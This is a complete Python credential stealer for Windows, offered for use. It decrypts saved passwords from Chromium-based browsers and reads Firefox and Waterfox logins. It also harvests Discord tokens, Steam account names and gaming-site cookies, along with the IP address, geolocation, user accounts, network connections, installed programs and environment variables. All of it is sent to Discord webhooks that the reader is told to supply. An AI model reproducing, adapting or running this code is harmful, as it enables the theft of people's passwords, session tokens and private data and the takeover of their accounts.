import requests
import json
import browser_cookie3
from datetime import datetime
import sqlite3
import os
import base64
import shutil
import win32crypt
from Cryptodome.Cipher import AES
import time
import socket
import glob
import re
import subprocess
import sys
import platform
import psutil
import winreg

#Replace these url's with your discord webhook's
IP_WEBHOOK_URL = ""
DATA_WEBHOOK_URL = ""
EXTRA_WEBHOOK_URL = ""
ADVANCED_WEBHOOK_URL = ""

EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % os.environ['USERPROFILE'])
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % os.environ['USERPROFILE'])
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])
OPERA_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State" % os.environ['USERPROFILE'])
OPERA_PATH = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable" % os.environ['USERPROFILE'])
BRAVE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State" % os.environ['USERPROFILE'])
BRAVE_PATH = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % os.environ['USERPROFILE'])
VIVALDI_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Vivaldi\User Data\Local State" % os.environ['USERPROFILE'])
VIVALDI_PATH = os.path.normpath(r"%s\AppData\Local\Vivaldi\User Data" % os.environ['USERPROFILE'])
UCBROWSER_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\UCBrowser\User Data\Local State" % os.environ['USERPROFILE'])
UCBROWSER_PATH = os.path.normpath(r"%s\AppData\Local\UCBrowser\User Data" % os.environ['USERPROFILE'])
FIREFOX_PATH = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
WATERFOX_PATH = os.path.join(os.getenv("APPDATA"), "Waterfox", "Profiles")
DISCORD_PATH = os.path.normpath(r"%s\AppData\Roaming\discord\Local Storage\leveldb" % os.environ['USERPROFILE'])
STEAM_PATH = os.path.normpath(r"%s\Program Files (x86)\Steam" % os.environ['SYSTEMDRIVE'])

# Decryption functions
def get_secret_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        decrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(decrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Failed to get secret key from {local_state_path}: {str(e)}")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            iv = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = generate_cipher(secret_key, iv)
            decrypted = decrypt_payload(cipher, encrypted_password)
            return decrypted.decode('utf-8')
        else:
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode('utf-8')
    except:
        return None

def get_db_connection(db_path, temp_name="temp.db"):
    try:
        shutil.copy2(db_path, temp_name)
        return sqlite3.connect(temp_name)
    except Exception as e:
        print(f"Failed to connect to database {db_path}: {str(e)}")
        return None

# Fetch browser passwords
def get_browser_passwords(browser_name, path, local_state_path):
    try:
        login_db = os.path.join(path, "Default", "Login Data")
        if not os.path.exists(login_db):
            print(f"{browser_name} Login Data not found at {login_db}")
            return ""
        
        secret_key = get_secret_key(local_state_path)
        if not secret_key:
            print(f"{browser_name} secret key not retrieved")
        
        conn = get_db_connection(login_db, f"{browser_name.lower()}_temp.db")
        if not conn:
            return ""
        
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        
        passwords = []
        for url, username, encrypted_password, date_created in cursor.fetchall():
            if encrypted_password:
                decrypted = decrypt_password(encrypted_password, secret_key) if secret_key else None
                creation_time = datetime.fromtimestamp(date_created / 1000000 - 11644473600).strftime('%Y-%m-%d %H:%M:%S') if date_created else "Unknown"
                entry = f"URL: {url}\nUser: {username}\nPass: {decrypted or '[Encrypted]'}\nCreated: {creation_time}"
                passwords.append(entry)
                    
        conn.close()
        os.remove(f"{browser_name.lower()}_temp.db")
        return "\n\n".join(passwords) if passwords else ""
    except Exception as e:
        print(f"Error in get_{browser_name.lower()}_passwords: {str(e)}")
        return ""

def get_firefox_based_passwords(browser_name, base_path):
    try:
        profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d))]
        if not profiles:
            print(f"No {browser_name} profiles found")
            return ""
        
        profile = os.path.join(base_path, profiles[0])
        logins_file = os.path.join(profile, "logins.json")
        if not os.path.exists(logins_file):
            print(f"{browser_name} logins.json not found")
            return ""
        
        with open(logins_file, 'r') as f:
            data = json.load(f)
        
        passwords = []
        for login in data.get("logins", []):
            url = login.get("hostname")
            username = login.get("encryptedUsername")
            password = login.get("encryptedPassword")
            creation_time = datetime.fromtimestamp(login.get("timeCreated", 0) / 1000).strftime('%Y-%m-%d %H:%M:%S') if login.get("timeCreated") else "Unknown"
            entry = f"URL: {url}\nUser: {username}\nPass (Encrypted): {password[:20]}...\nCreated: {creation_time}"
            passwords.append(entry)
                
        return "\n\n".join(passwords) if passwords else ""
    except Exception as e:
        print(f"Error in get_{browser_name.lower()}_passwords: {str(e)}")
        return ""


def get_discord_tokens():
    try:
        tokens = []
        if os.path.exists(DISCORD_PATH):
            for file in glob.glob(os.path.join(DISCORD_PATH, "*.ldb")) + glob.glob(os.path.join(DISCORD_PATH, "*.log")):
                with open(file, "rb") as f:
                    content = f.read().decode('utf-8', errors='ignore')
                    for token in set(re.findall(r'[A-Za-z0-9]{24,32}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27,38}', content)):
                        tokens.append(f"Discord Token: {token[:20]}...")
        return "\n\n".join(tokens[:10]) if tokens else ""
    except Exception as e:
        print(f"Error retrieving Discord tokens: {str(e)}")
        return ""


def get_steam_credentials():
    try:
        config_file = os.path.join(STEAM_PATH, "config", "loginusers.vdf")
        if not os.path.exists(config_file):
            print("Steam loginusers.vdf not found")
            return ""
        
        with open(config_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        credentials = []
        lines = content.splitlines()
        for i, line in enumerate(lines):
            if "AccountName" in line:
                username = line.split('"')[3]
                credentials.append(f"Steam User: {username}\nPass: [Not Stored Locally]")
        return "\n\n".join(credentials) if credentials else ""
    except Exception as e:
        print(f"Error retrieving Steam credentials: {str(e)}")
        return ""

def get_browser_cookies():
    cookies = []
    for browser, func in [
        ("Chrome", browser_cookie3.chrome),
        ("Firefox", browser_cookie3.firefox),
        ("Edge", browser_cookie3.edge),
        ("Opera", browser_cookie3.opera),
        ("Brave", browser_cookie3.brave),
        ("Vivaldi", browser_cookie3.vivaldi),
    ]:
        try:
            browser_cookies = func()
            cookie_list = "\n".join([f"{c.name}: {c.value[:20]}... ({c.domain})" for c in browser_cookies if "epicgames.com" in c.domain or "roblox.com" in c.domain][:3])
            if cookie_list:
                cookies.append(f"**{browser} Cookies**:\n{cookie_list}")
        except Exception as e:
            print(f"Error retrieving {browser} cookies: {str(e)}")
    return "\n\n".join(cookies) if cookies else ""

def get_public_ip_and_location():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        public_ip = response.json()["ip"]
        response = requests.get(f"http://ip-api.com/json/{public_ip}")
        data = response.json()
        if data["status"] == "success":
            return {
                "public_ip": public_ip,
                "land": data["country"],
                "regio": data["regionName"],
                "stad": data["city"],
                "latitude": data["lat"],
                "longitude": data["lon"]
            }
        return {"public_ip": public_ip, "location": "Location unavailable"}
    except Exception as e:
        return {"public_ip": "Could not fetch IP", "location": f"Error: {str(e)}"}

def get_extra_system_info():
    username = os.environ['USERNAME']
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    extra_info = []

    event_logs_path = r"C:\Windows\System32\winevt\Logs"
    if os.path.exists(event_logs_path):
        event_logs = []
        for log_file in glob.glob(os.path.join(event_logs_path, "*.evtx"))[:10]:  # Limit to 10 files
            file_stats = os.stat(log_file)
            event_logs.append(
                f"Name: {os.path.basename(log_file)}\n"
                f"Size: {file_stats.st_size / 1024:.2f} KB\n"
                f"Last Modified: {datetime.fromtimestamp(file_stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}"
            )
        extra_info.append(f"📜 **Event Logs ({len(event_logs)} found)** 📜\n" + "\n\n".join(event_logs) if event_logs else "No log files found")
    else:
        extra_info.append("📜 **Event Logs** 📜\nPath not found")

    try:
        result = subprocess.run("net user", capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            net_user_output = result.stdout.strip()
            extra_info.append(
                f"👤 **Net User Output** 👤\n"
                f"```markdown\n{net_user_output}\n```"
            )
        else:
            extra_info.append(f"👤 **Net User** 👤\nError executing: {result.stderr}")
    except Exception as e:
        extra_info.append(f"👤 **Net User** 👤\nError: {str(e)}")

    recent_path = os.path.normpath(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
    if os.path.exists(recent_path):
        recent_files = []
        for recent_file in glob.glob(os.path.join(recent_path, "*.lnk"))[:10]:  # Limit to 10 files
            file_stats = os.stat(recent_file)
            recent_files.append(
                f"Name: {os.path.basename(recent_file)}\n"
                f"Creation Date: {datetime.fromtimestamp(file_stats.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}"
            )
        extra_info.append(f"📂 **Recent Files ({len(recent_files)} found)** 📂\n" + "\n\n".join(recent_files) if recent_files else "No recent files found")
    else:
        extra_info.append("📂 **Recent Files** 📂\nPath not found")

    messages = []
    current_message = f"🖥️ **Extra System Info | {timestamp}** 🖥️\n═══════════════════════\n"
    for info in extra_info:
        if len(current_message) + len(info) + 20 > 1900:
            current_message += "═══════════════════════"
            messages.append(current_message)
            current_message = f"🖥️ **Extra System Info (Continued) | {timestamp}** 🖥️\n═══════════════════════\n"
        current_message += info + "\n\n"
    current_message += "═══════════════════════"
    messages.append(current_message)
    return messages

def get_advanced_system_info():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    advanced_messages = []

    try:
        cpu_info = f"CPU: {platform.processor()}"
        ram_info = f"RAM: {psutil.virtual_memory().total / (1024**3):.2f} GB"
        os_info = f"OS: {platform.system()} {platform.release()} ({platform.version()})"
        spec_message = (
            f"🔍 **Advanced System Info | {timestamp} - Part 1** 🔍\n"
            f"═══════════════════════\n"
            f"🖥️ **System Specifications** 🖥️\n"
            f"{cpu_info}\n{ram_info}\n{os_info}\n"
            f"═══════════════════════"
        )
        advanced_messages.append(spec_message)
    except Exception as e:
        advanced_messages.append(
            f"🔍 **Advanced System Info | {timestamp} - Part 1** 🔍\n"
            f"═══════════════════════\n"
            f"🖥️ **System Specifications** 🖥️\nError: {str(e)}\n"
            f"═══════════════════════"
        )

    try:
        programs = []
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
            for i in range(100):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    with winreg.OpenKey(key, subkey_name) as subkey:
                        name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                        programs.append(name)
                except OSError:
                    break
        programs_text = "\n".join(programs[:10])
        programs_message = (
            f"🔍 **Advanced System Info | {timestamp} - Part 2** 🔍\n"
            f"═══════════════════════\n"
            f"📦 **Installed Programs ({len(programs)})** 📦\n"
            f"```markdown\n{programs_text}\n```"
            f"═══════════════════════"
        )
        advanced_messages.append(programs_message)
    except Exception as e:
        advanced_messages.append(
            f"🔍 **Advanced System Info | {timestamp} - Part 2** 🔍\n"
            f"═══════════════════════\n"
            f"📦 **Installed Programs** 📦\nError: {str(e)}\n"
            f"═══════════════════════"
        )

    try:
        result = subprocess.run("netstat -ano", capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            netstat_output = result.stdout.strip()
            netstat_parts = [netstat_output[i:i+1500] for i in range(0, len(netstat_output), 1500)]
            for idx, part in enumerate(netstat_parts, 1):
                netstat_message = (
                    f"🔍 **Advanced System Info | {timestamp} - Part {2 + idx}** 🔍\n"
                    f"═══════════════════════\n"
                    f"🌐 **Network Connections (Part {idx})** 🌐\n"
                    f"```markdown\n{part}\n```"
                    f"═══════════════════════"
                )
                advanced_messages.append(netstat_message)
        else:
            advanced_messages.append(
                f"🔍 **Advanced System Info | {timestamp} - Part 3** 🔍\n"
                f"═══════════════════════\n"
                f"🌐 **Network Connections** 🌐\nError: {result.stderr}\n"
                f"═══════════════════════"
            )
    except Exception as e:
        advanced_messages.append(
            f"🔍 **Advanced System Info | {timestamp} - Part 3** 🔍\n"
            f"═══════════════════════\n"
            f"🌐 **Network Connections** 🌐\nError: {str(e)}\n"
            f"═══════════════════════"
        )

    try:
        env_vars = "\n".join([f"{k}: {v}" for k, v in os.environ.items()][:10])
        env_message = (
            f"🔍 **Advanced System Info | {timestamp} - Part {len(advanced_messages) + 3}** 🔍\n"
            f"═══════════════════════\n"
            f"⚙️ **Environment Variables** ⚙️\n"
            f"```markdown\n{env_vars}\n```"
            f"═══════════════════════"
        )
        advanced_messages.append(env_message)
    except Exception as e:
        advanced_messages.append(
            f"🔍 **Advanced System Info | {timestamp} - Part {len(advanced_messages) + 3}** 🔍\n"
            f"═══════════════════════\n"
            f"⚙️ **Environment Variables** ⚙️\nError: {str(e)}\n"
            f"═══════════════════════"
        )

    return advanced_messages


def format_messages():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    system_info = get_public_ip_and_location()
    
    chrome_pass = get_browser_passwords("Chrome", CHROME_PATH, CHROME_PATH_LOCAL_STATE)
    firefox_pass = get_firefox_based_passwords("Firefox", FIREFOX_PATH)
    edge_pass = get_browser_passwords("Edge", EDGE_PATH, EDGE_PATH_LOCAL_STATE)
    opera_pass = get_browser_passwords("Opera", OPERA_PATH, OPERA_PATH_LOCAL_STATE)
    brave_pass = get_browser_passwords("Brave", BRAVE_PATH, BRAVE_PATH_LOCAL_STATE)
    vivaldi_pass = get_browser_passwords("Vivaldi", VIVALDI_PATH, VIVALDI_PATH_LOCAL_STATE)
    ucbrowser_pass = get_browser_passwords("UCBrowser", UCBROWSER_PATH, UCBROWSER_PATH_LOCAL_STATE)
    waterfox_pass = get_firefox_based_passwords("Waterfox", WATERFOX_PATH)
    discord_tokens = get_discord_tokens()
    steam_creds = get_steam_credentials()
    cookies = get_browser_cookies()
    extra_info = get_extra_system_info()
    advanced_info = get_advanced_system_info()
    
    ip_messages = []
    data_messages = []
    extra_messages = extra_info
    advanced_messages = advanced_info
    
    location_str = (
        f"Country: {system_info['land']}\n"
        f"Region: {system_info['regio']}\n"
        f"City: {system_info['stad']}\n"
        f"Lat: {system_info['latitude']}, Lon: {system_info['longitude']}"
    ) if "land" in system_info else str(system_info["location"])
    
    ip_message = (
        f"💻 **System Info | {timestamp}** 💻\n"
        f"═══════════════════════\n"
        f"**Hostname:** {socket.gethostname()}\n"
        f"**Local IP:** {socket.gethostbyname(socket.gethostname())}\n"
        f"**Public IP:** {system_info['public_ip']}\n"
        f"**Location:**\n{location_str}\n"
        f"═══════════════════════"
    )
    ip_messages.append(ip_message)
    
    sources = [
        ("Chrome", chrome_pass),
        ("Firefox", firefox_pass),
        ("Edge", edge_pass),
        ("Opera", opera_pass),
        ("Brave", brave_pass),
        ("Vivaldi", vivaldi_pass),
        ("UCBrowser", ucbrowser_pass),
        ("Waterfox", waterfox_pass),
        ("Discord", discord_tokens),
        ("Steam", steam_creds)
    ]
    
    part_num = 1
    for source_name, data in sources:
        if data:
            lines = data.split("\n\n")
            for chunk in [lines[k:k+5] for k in range(0, len(lines), 5)]:
                part = f"🔑 **{source_name} Data | {timestamp} - Part {part_num}** 🔑\n═══════════════════════\n\n```\n{'\n\n'.join(chunk)}\n```"
                if len(part) > 1900:
                    part = part[:1890] + "\n[Truncated]"
                data_messages.append(part)
                part_num += 1
    
    cookies_part = f"🍪 **Browser Cookies | {timestamp} - Part {part_num}** 🍪\n═══════════════════════\n\n```\n{cookies}\n```\n═══════════════════════\n📋 *One-time report*"
    if len(cookies_part) > 1900:
        cookies_part = cookies_part[:1890] + "\n[Truncated]"
    data_messages.append(cookies_part)
    
    return ip_messages, data_messages, extra_messages, advanced_messages

def send_to_discord(webhook_url, messages, webhook_type="Data"):
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        username = f"{hostname} ({ip_address})"
        
        for i, message in enumerate(messages, 1):
            if not message or message.isspace():
                message = "No content available"
            if len(message) > 2000:
                message = message[:1990] + "\n[Truncated]"
                
            data = {
                "content": message,
                "username": username,
                "avatar_url": "https://tr.rbxcdn.com/180DAY-e206530a5712708d08fdeafa8dd0c464/420/420/Hat/Webp/noFilter"
            }
            
            response = requests.post(
                webhook_url,
                data=json.dumps(data),
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 204:
                print(f"[{datetime.now()}] Successfully sent {webhook_type} part {i} to Discord")
            else:
                print(f"[{datetime.now()}] Failed to send {webhook_type} part {i}. Status: {response.status_code}")
                print(f"Response: {response.text}")
            time.sleep(1)
            
    except Exception as e:
        print(f"[{datetime.now()}] Error sending to Discord ({webhook_type}): {str(e)}")

def main():
    print("Generating enhanced report with split webhooks...")
    ip_messages, data_messages, extra_messages, advanced_messages = format_messages()
    
    send_to_discord(IP_WEBHOOK_URL, ip_messages, "IP/Location")

    send_to_discord(DATA_WEBHOOK_URL, data_messages, "Data")
    
    send_to_discord(EXTRA_WEBHOOK_URL, extra_messages, "Extra Info")
    
    send_to_discord(ADVANCED_WEBHOOK_URL, advanced_messages, "Advanced Info")
    
    print("Report sent to respective webhooks. Program completed.")

if __name__ == "__main__":
    main()